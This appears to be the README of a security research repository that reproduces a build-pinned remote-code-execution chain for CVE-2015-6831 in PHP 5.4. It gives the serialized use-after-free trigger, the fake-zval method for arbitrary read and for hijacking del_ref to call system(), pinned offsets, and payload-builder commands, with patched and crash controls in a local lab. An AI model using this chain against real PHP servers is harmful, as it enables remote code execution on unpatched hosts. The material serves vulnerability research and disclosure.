# PHP 5.4 SPL UAF: heap leak, arbitrary read, ASLR rebase, and 176-byte RCE

[![static-tests](https://github.com/wjdekq113/php54-spl-uaf-rce-chain/actions/workflows/static-tests.yml/badge.svg)](https://github.com/wjdekq113/php54-spl-uaf-rce-chain/actions/workflows/static-tests.yml)

[한국어](README.ko.md) · [Complete ASLR chain](ASLR_CHAIN.md) · [Sources](SOURCES.md) · [Evidence](evidence/README.md)

This repository reconstructs a complete, build-pinned code-execution chain for
**CVE-2015-6831** on PHP 5.4:

```text
SplObjectStorage heap leak
  -> ArrayObject arbitrary read
  -> PHP/libc/loader/libpthread ASLR rebase
  -> verified __libc_system GOT slot
  -> 176-byte ArrayObject handlers->del_ref payload
  -> system(">/x/<random>")
```

The integration case resolves every runtime base from exploit responses.  It
does **not** read `/proc/<pid>/maps` or `/proc/<pid>/mem`.  The same pinned image
also runs direct CGI/FPM mechanism controls and builds upstream PHP 5.4.44 from
the official hash-pinned source archive as a fixed-version control.

> This is a deliberately vulnerable local research image.  It publishes no
> host port and is removed after the run.  Read [SECURITY.md](SECURITY.md)
> before using it.

## Reproduced cases

| Case | Runtime | Verified result |
|---|---|---|
| Full ASLR-to-RCE chain | CentOS PHP-FPM 5.4.16 | 101-byte heap leak, 176-byte arbitrary reads, four DSO bases and Build IDs, system GOT equality, marker creation, worker replacement |
| Direct vulnerable CGI | CentOS PHP-CGI 5.4.16 | 176-byte payload creates a random marker through `system()` |
| Invalid-handler control | Same vulnerable CGI | UAF dispatch crashes and creates no marker |
| Patched control | Upstream PHP 5.4.44 CGI | Normal `rows=1` response, no crash, no marker |
| Direct vulnerable FPM | CentOS PHP-FPM 5.4.16 | Marker creation, request reset, exploited worker exit, replacement worker |

The full chain is the primary exploit demonstration.  The direct CGI/FPM cases
use host process inspection only as independent mechanism controls: they verify
the live GOT slot before sending the final body.  They are not used to supply an
address to the full ASLR chain.

## Quick start

Requirements:

- Linux amd64;
- rootless or rootful Podman;
- Python 3.10+;
- network access to the frozen CentOS archive and PHP museum during the first
  image build.

Run all five cases and regenerate the evidence bundle:

```bash
python3 lab/centos7/reproduce.py --build --evidence evidence
```

The runner builds the digest-pinned image, starts a disposable container with no
published port, executes the complete chain and all controls, writes hashed
evidence, and removes the container and marker directory.  Success exits zero
and prints `"all_success": true`.

Run the static tests without starting vulnerable PHP:

```bash
python3 -m unittest discover -s tests -v
```

## Payload builder

The builder exposes all three stages rather than only the final trigger.

```bash
# 101-byte SplObjectStorage pointer leak
python3 poc/build_payload.py --mode heap-leak --out heap-leak.bin

# 176-byte ArrayObject arbitrary read
python3 poc/build_payload.py --mode read \
  --address 0x7f0000000000 --length 256 --out read.bin

# 176-byte final del_ref execution payload
python3 poc/build_payload.py --mode exec \
  --pthread-base 0x7f0000000000 \
  --got-offset 0x217088 \
  --cmd '>/tmp/R' --out exec.bin
```

Manual addresses above are builder examples only.  The integrated ASLR case
starts from the heap leak and derives its live addresses through the arbitrary
read primitive.

## Complete ASLR chain

The complete implementation is
[`lab/centos7/verify_aslr_chain.py`](lab/centos7/verify_aslr_chain.py), and the
address derivation is documented step by step in [ASLR_CHAIN.md](ASLR_CHAIN.md).
The successful path is:

1. send the 101-byte `SplObjectStorage` body and parse a decimal heap pointer;
2. use the 176-byte `ArrayObject` `IS_STRING` payload to read 4096 heap bytes;
3. locate `_zval_ptr_dtor` and derive the PHP PIE base;
4. verify PHP ELF magic and Build ID;
5. read PHP `iconv@GOT`, derive libc, and verify libc ELF and Build ID;
6. read PHP `DT_DEBUG`, derive the loader, and verify its ELF and Build ID;
7. read `_rtld_global+0xf00`, derive libpthread from `pthread_mutex_lock`, and
   verify its ELF and Build ID;
8. require `pthread+0x217088 == libc+system`;
9. build and send the final 176-byte `handlers->del_ref` body.

The pinned offsets, hashes, and Build IDs are explicit in
[`rebase_profile.json`](lab/centos7/rebase_profile.json).  A mismatch stops the
state machine before the execution payload.

The local fixture emits arbitrary-read bytes as hexadecimal so the public lab
does not depend on any application-specific HTML, route, query parameter, or
character encoding.  [`poc/lossy_utf8.py`](poc/lossy_utf8.py) retains the
bounded UTF-8 replacement/wildcard recovery for lossy rendering sinks.

## Vulnerability lineage

The chain intentionally combines two distinct SPL unserialize bugs:

| Stage | PHP report | Role |
|---|---|---|
| heap bootstrap | #70168, `SplObjectStorage` | returns a dangling heap value used as the first mapped read address |
| arbitrary read and final dispatch | #70155/#70166, `ArrayObject` | reclaims the freed 24-byte zval as `IS_STRING` or `IS_OBJECT` |

All are assigned within CVE-2015-6831.  The direct #70166 fix is
`7381b6accc5559b2de039af3a22f6ec1003b03b3`; #70168 was fixed by
`c2e197e4efc663ca55f393bf0e799848842286f3`.  PHP 5.4.44, 5.5.28, and 5.6.12
contain the upstream fixes.  #70068/CVE-2015-6832 is a different
`ArrayObject` items dangling-pointer issue and is not used here.  Primary
reports and commits are listed in [SOURCES.md](SOURCES.md).

## `ArrayObject` trigger and fake zvals

The shared #70166 inner stream is:

```text
x:i:0;O:12:"DateInterval":1:{s:1:"y";R:5;};m:a:1:{i:0;R:4;}
```

`R:5` is the `DateInterval` self-reference.  `R:4` reaches the temporary
`pflags` zval left reachable through the vulnerable unserialize reference
table.  A later 24-byte serialized string allocation replaces that freed zval.

For arbitrary read, the replacement is an `IS_STRING` zval containing an
address and length.  For execution it is an `IS_OBJECT` zval containing an
inline command, forged handlers pointer, and `refcount=1`.

PHP destruction calls `handlers->del_ref(zval *)`.  On AMD64 the zval address is
the first function argument, so redirecting `del_ref` to `system()` executes the
command stored in the first qword.  Since `del_ref` is the second handler-table
pointer:

```text
handlers = address_of_resolved_system_GOT_slot - 8
```

The inline qword permits 1–7 ASCII command bytes plus NUL.  The process normally
faults after `system()` returns, so marker creation and worker replacement—not a
truncated response—are the execution proof.

## Build-pinned scope

This is a complete chain for the supplied profile, not a version-independent
PHP exploit:

- x86-64 little-endian, non-ZTS PHP 5.4, 24-byte zvals;
- `php-fpm-5.4.16-48.el7` and `glibc-2.17-317.el7` from the frozen CentOS 7.9
  `os` repository;
- exact file hashes, Build IDs, symbol offsets, and relocations are verified;
- the output fixture is local and lossless; adapting another application means
  supplying an equivalent way to render the forged string;
- the seven-byte inline command limit remains unchanged.

No absolute ASLR address is committed as a reusable exploit input.  Each run
begins with a fresh heap leak and recalculates every base.

## Evidence

Committed evidence is one complete five-case snapshot.  The ASLR subdirectory
contains the 101-byte leak body, final 176-byte trigger, request-by-request
trace, and derived-address result.  PIDs, bases, marker token, and dynamic
payload hashes change on every run; the structural and fingerprint invariants
must remain constant.  See [evidence/README.md](evidence/README.md).

## Repository layout

```text
poc/build_payload.py                 leak/read/exec payload builder
poc/lossy_utf8.py                    generic lossy-pointer recovery helpers
lab/rebase_app.php                   lossless local arbitrary-read output fixture
lab/vuln_app.php                     minimal trigger/control fixture
lab/centos7/rebase_profile.json      pinned symbols, hashes, and Build IDs
lab/centos7/verify_aslr_chain.py     no-/proc heap-leak-to-RCE state machine
lab/centos7/verify_evidence.py       offline chain-evidence verifier
lab/centos7/verify_php_cgi.py        direct CGI mechanism controls
lab/centos7/verify_php_fpm.py        direct FPM mechanism control
lab/centos7/reproduce.py             one-command runner and evidence collector
tests/test_payload.py                payload, resolver, and loss-model tests
evidence/                            complete generated evidence
```

## License

Repository-authored code and documentation are released under the
[MIT License](LICENSE).  PHP source and vendor packages are fetched from their
original distributors and retain their own licenses.
